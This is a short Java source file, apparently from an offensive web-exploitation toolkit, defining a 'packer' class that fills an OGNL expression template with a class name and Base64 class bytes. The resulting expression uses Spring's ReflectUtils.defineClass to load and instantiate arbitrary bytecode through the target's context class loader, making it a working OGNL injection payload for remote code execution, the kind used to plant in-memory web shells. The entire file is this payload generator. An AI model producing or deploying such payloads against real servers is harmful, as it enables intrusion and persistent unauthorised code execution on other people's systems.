package com.reajason.javaweb.packer.ognl;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;

/**
 * @author ReaJason
 * @since 2025/7/7
 */
public class OGNLSpringUtilsPacker implements Packer {
    String template = "(@org.springframework.cglib.core.ReflectUtils@defineClass('{{className}}',@org.springframework.util.Base64Utils@decodeFromString('{{base64Str}}'),@java.lang.Thread@currentThread().getContextClassLoader())).newInstance()";

    @Override
    public String pack(ClassPackerConfig config) {
        return template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", config.getClassBytesBase64Str());
    }
}
